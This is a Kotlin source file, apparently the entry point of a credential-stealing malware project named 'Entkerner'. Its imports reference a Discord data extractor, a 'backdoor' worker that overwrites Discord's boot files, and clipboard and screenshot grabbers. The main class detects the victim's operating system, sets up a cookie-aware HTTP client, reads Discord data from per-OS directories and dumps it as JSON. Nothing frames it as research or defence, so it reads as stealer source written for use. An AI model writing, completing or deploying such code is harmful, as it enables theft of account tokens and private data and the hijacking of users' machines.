package net.kerner.entkerner

import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.plugins.contentnegotiation.*
import io.ktor.client.plugins.cookies.*
import io.ktor.serialization.kotlinx.json.*
import kotlinx.coroutines.runBlocking
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import net.kerner.entkerner.abstract.AbstractDataExtractor
import net.kerner.entkerner.abstract.get
import net.kerner.entkerner.backdoor.discord.DiscordBootOverwriteWorker
import net.kerner.entkerner.extractors.discord.DiscordData
import net.kerner.entkerner.extractors.discord.DiscordDataWorker
import net.kerner.entkerner.extractors.screen.ScreenData
import net.kerner.entkerner.extractors.screen.ScreenExtractionWorker
import net.kerner.entkerner.extractors.screen.ScreenScreenshotWorker
import net.kerner.entkerner.extractors.standart.ClipboardExtractionWorker
import net.kerner.entkerner.model.SystemType
import java.awt.image.BufferedImage
import java.io.File

class Entkerner {
    val system = when(System.getProperty("os.name").lowercase()) {
        "windows " -> SystemType.WINDOWS
        "linux" -> SystemType.LINUX
        "xnu" -> SystemType.XNU // probably not working, need to test each of these
        else -> SystemType.WINDOWS // most common used on desktop
    }
    val extractors = listOf(::DiscordDataWorker)
    val httpClient = HttpClient(CIO) {
        install(ContentNegotiation) {
            json(Json {
                ignoreUnknownKeys = true
                prettyPrint = true
            })
        }
        install(HttpCookies) {

        }
    }
    init {
        runBlocking {
            val screenshot = DiscordDataWorker(httpClient, this@Entkerner)
            runExtractor(screenshot as AbstractDataExtractor<Any, DiscordData>)
        }
    }
    private suspend inline fun <reified V> runExtractor(dataExtractor: AbstractDataExtractor<Any, V>): Boolean {
        val file = dataExtractor.fileDirectories[system].toFile()
        if (!file.exists()) return false
        val resultT = dataExtractor.extractData(file)
        val resultV = dataExtractor.handleExtractedData(resultT)
        println(Json.encodeToString(resultV as V))
        return true
    }
}

fun main() {
    Entkerner()
}